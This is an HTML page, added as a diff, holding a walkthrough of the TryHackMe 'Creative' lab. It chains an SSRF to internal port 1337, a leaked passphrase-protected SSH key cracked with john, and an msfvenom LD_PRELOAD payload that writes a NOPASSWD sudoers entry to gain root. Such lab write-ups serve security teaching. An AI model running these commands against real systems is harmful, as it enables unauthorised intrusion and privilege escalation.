@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Creative — TryHackMe Writeup | Oussama Zehri</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../../style.css">
+    <link rel="icon" type="image/png" href="data:image/png;base64,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">
+</head>
+<body>
+
+<nav>
+    <a href="../../index.html">~/oussama</a>
+    <span class="sep">/</span>
+    <a href="../../writeups.html">writeups</a>
+    <span class="sep">/</span>
+    <span class="current">creative</span>
+</nav>
+
+<header class="wu-header">
+    <div class="badge-row">
+        <span class="badge red">TryHackMe</span>
+        <span class="badge">Easy</span>
+        <span class="badge">SSRF</span>
+        <span class="badge">SSH Key Exposure</span>
+        <span class="badge">LD_PRELOAD</span>
+        <span class="badge green">Rooted ✅</span>
+    </div>
+    <h1>Creative</h1>
+    <div class="meta">
+        Target: <span>10.114.165.52</span> &nbsp;·&nbsp; Difficulty: <span>Easy</span> &nbsp;·&nbsp; Path: <span>Web → SSRF → SSH → PrivEsc</span>
+    </div>
+</header>
+
+<div class="toc">
+    <h2>// Table of Contents</h2>
+    <ol>
+        <li><a href="#recon">Recon & Port Scanning</a></li>
+        <li><a href="#web">Web Enumeration</a></li>
+        <li><a href="#ssrf">SSRF Discovery</a></li>
+        <li><a href="#ports">Internal Port Discovery</a></li>
+        <li><a href="#sshkey">SSH Key Exposure</a></li>
+        <li><a href="#access">Initial Access</a></li>
+        <li><a href="#privesc">Privilege Escalation</a></li>
+        <li><a href="#root">Root Access</a></li>
+        <li><a href="#chain">Attack Chain</a></li>
+        <li><a href="#lessons">Key Takeaways</a></li>
+    </ol>
+</div>
+
+<main class="wu-main">
+
+    <!-- RECON -->
+    <div class="section" id="recon">
+        <h2 class="section-title"><span class="icon">01</span> Recon & Port Scanning</h2>
+        <p>Full port scan with service and version detection:</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Nmap Scan</span></div>
+            <pre><code>nmap -sC -sV -p- 10.114.165.52</code></pre>
+        </div>
+        <h3>📡 Open Ports</h3>
+        <div class="table-wrap">
+            <table>
+                <thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead>
+                <tbody>
+                    <tr><td>22</td><td>SSH</td><td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.11</td></tr>
+                    <tr><td>80</td><td>HTTP</td><td>nginx 1.18.0 (Ubuntu)</td></tr>
+                </tbody>
+            </table>
+        </div>
+        <div class="callout">Port 80 exposes a web application — primary attack surface.</div>
+    </div>
+
+    <!-- WEB ENUM -->
+    <div class="section" id="web">
+        <h2 class="section-title"><span class="icon">02</span> Web Enumeration</h2>
+        <p>Add the domain to the local hosts file:</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Update /etc/hosts</span></div>
+            <pre><code>echo "10.114.165.52 creative.thm" | sudo tee -a /etc/hosts</code></pre>
+        </div>
+        <h3>Directory Fuzzing</h3>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Gobuster Dir</span></div>
+            <pre><code>gobuster dir -u http://creative.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre>
+        </div>
+        <p>No interesting directories found. Pivot to subdomain enumeration.</p>
+        <h3>Subdomain Fuzzing</h3>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Gobuster DNS</span></div>
+            <pre><code>gobuster dns -d creative.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</code></pre>
+        </div>
+        <div class="callout green">Subdomain discovered ✔️</div>
+    </div>
+
+    <!-- SSRF -->
+    <div class="section" id="ssrf">
+        <h2 class="section-title"><span class="icon">03</span> Parameter Analysis & SSRF Discovery</h2>
+        <p>Manual parameter testing revealed unsanitized input:</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">url</span><span>LFI Attempt</span></div>
+            <pre><code>http://creative.thm/?contact-message=/etc/passwd</code></pre>
+        </div>
+        <p>Application did not sanitize the parameter — hints at file interaction and possible SSRF.</p>
+        <p>Further testing on the discovered subdomain confirmed a <strong style="color:#fff">Server-Side Request Forgery (SSRF)</strong> vulnerability.</p>
+        <div class="callout">
+            🚨 SSRF allows the server to make requests on your behalf — including to internal services not exposed externally.
+        </div>
+    </div>
+
+    <!-- INTERNAL PORTS -->
+    <div class="section" id="ports">
+        <h2 class="section-title"><span class="icon">04</span> Internal Port Discovery via SSRF</h2>
+        <p>A custom script was written to fuzz internal ports through the SSRF endpoint, probing <code>127.0.0.1:PORT</code> for each port.</p>
+        <h3>Open Internal Ports Discovered</h3>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">output</span><span>Internal Ports</span></div>
+            <pre><code>80    → HTTP (internal)
+1337  → Sensitive data exposed</code></pre>
+        </div>
+        <div class="callout green">
+            💡 Port <strong style="color:#fff">1337</strong> returned sensitive server data — this is the key pivot point.
+        </div>
+    </div>
+
+    <!-- SSH KEY -->
+    <div class="section" id="sshkey">
+        <h2 class="section-title"><span class="icon">05</span> SSH Key Exposure</h2>
+        <p>Interacting with port 1337 via SSRF revealed an SSH private key (<code>id_rsa</code>). The key was passphrase-protected.</p>
+        <h3>Cracking the Passphrase</h3>
+        <p>Convert the key to a crackable hash format:</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Convert Key for John</span></div>
+            <pre><code>ssh2john id_rsa > hash.txt</code></pre>
+        </div>
+        <p>Crack with John the Ripper:</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Crack Passphrase</span></div>
+            <pre><code>john hash.txt</code></pre>
+        </div>
+        <div class="callout green">Passphrase retrieved ✔️</div>
+    </div>
+
+    <!-- ACCESS -->
+    <div class="section" id="access">
+        <h2 class="section-title"><span class="icon">06</span> Initial Access</h2>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>SSH Login</span></div>
+            <pre><code>chmod 600 id_rsa
+ssh -i id_rsa saad@10.114.165.52
+# Enter cracked passphrase when prompted</code></pre>
+        </div>
+        <div class="callout green">Shell obtained as user <strong style="color:#fff">saad</strong> ✔️</div>
+    </div>
+
+    <!-- PRIVESC -->
+    <div class="section" id="privesc">
+        <h2 class="section-title"><span class="icon">07</span> Privilege Escalation</h2>
+        <p>User <code>saad</code> had sudo access to specific binaries. Exploit using <code>LD_PRELOAD</code> to inject a malicious shared object.</p>
+        <h3>Step 1 — Generate Payload</h3>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>msfvenom — Shared Object Payload</span></div>
+            <pre><code>msfvenom -p linux/x64/exec \
+  CMD="echo 'saad ALL=(ALL:ALL) NOPASSWD: ALL' > /etc/sudoers.d/saad" \
+  AppendExit=true -f elf-so -o pwn.so</code></pre>
+        </div>
+        <h3>Step 2 — Upload to Target</h3>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>SCP Upload</span></div>
+            <pre><code>scp -i id_rsa pwn.so saad@10.114.165.52:/tmp/</code></pre>
+        </div>
+        <h3>Step 3 — Trigger via LD_PRELOAD</h3>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Execute Payload</span></div>
+            <pre><code>sudo LD_PRELOAD=/tmp/pwn.so /usr/bin/ping</code></pre>
+        </div>
+        <div class="callout green">Full sudo privileges granted to saad ✔️</div>
+    </div>
+
+    <!-- ROOT -->
+    <div class="section" id="root">
+        <h2 class="section-title"><span class="icon">08</span> Root Access</h2>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Escalate to Root</span></div>
+            <pre><code>sudo su</code></pre>
+        </div>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">output</span><span>Root Shell</span></div>
+            <pre><code>root@ip-10-114-165-52:~#</code></pre>
+        </div>
+        <div class="callout green">Root compromise successful ✔️</div>
+    </div>
+
+    <!-- CHAIN -->
+    <div class="section" id="chain">
+        <h2 class="section-title"><span class="icon">09</span> Attack Chain</h2>
+        <div class="chain">
+            <div class="chain-step">Nmap → Ports 22, 80 identified</div>
+            <div class="chain-arrow">↓</div>
+            <div class="chain-step">Gobuster DNS → Subdomain discovered</div>
+            <div class="chain-arrow">↓</div>
+            <div class="chain-step">Parameter testing → SSRF confirmed</div>
+            <div class="chain-arrow">↓</div>
+            <div class="chain-step">Internal port fuzzing via SSRF → Port 1337 found</div>
+            <div class="chain-arrow">↓</div>
+            <div class="chain-step">Port 1337 → SSH private key leaked</div>
+            <div class="chain-arrow">↓</div>
+            <div class="chain-step">ssh2john + john → Passphrase cracked</div>
+            <div class="chain-arrow">↓</div>
+            <div class="chain-step">SSH login as saad</div>
+            <div class="chain-arrow">↓</div>
+            <div class="chain-step">msfvenom LD_PRELOAD → sudo escalation</div>
+            <div class="chain-arrow">↓</div>
+            <div class="chain-step" style="border-left-color: var(--green); color: var(--green);">ROOT ACCESS ✅</div>
+        </div>
+    </div>
+
+    <!-- LESSONS -->
+    <div class="section" id="lessons">
+        <h2 class="section-title"><span class="icon">10</span> Key Takeaways</h2>
+        <ul class="lessons-list">
+            <li>Always test parameters manually — automated tools miss SSRF vectors.</li>
+            <li>SSRF can expose internal services invisible from outside.</li>
+            <li>Internal port fuzzing via SSRF is a powerful lateral technique.</li>
+            <li>Exposed SSH keys are dangerous even when passphrase-protected — they're often crackable.</li>
+            <li>Misconfigured sudo + LD_PRELOAD = instant root.</li>
+        </ul>
+        <div class="callout" style="margin-top:28px;">
+            <strong style="color:#fff">Final Thought:</strong> Creative demonstrates a clean chained attack —
+            <strong style="color:var(--red)">SSRF → Key Leak → Passphrase Crack → LD_PRELOAD Abuse</strong> = full compromise.
+        </div>
+    </div>
+
+</main>
+
+<footer>
+    <a href="../../writeups.html">← All Writeups</a> <a href="../../writeups.html">← Back to Writeups</a>nbsp;·<a href="../../writeups.html">← Back to Writeups</a>nbsp; <a href="index.html">← TryHackMe</a> &nbsp;·&nbsp; © 2026 Oussama Zehri
+</footer>
+
+</body>
+</html>
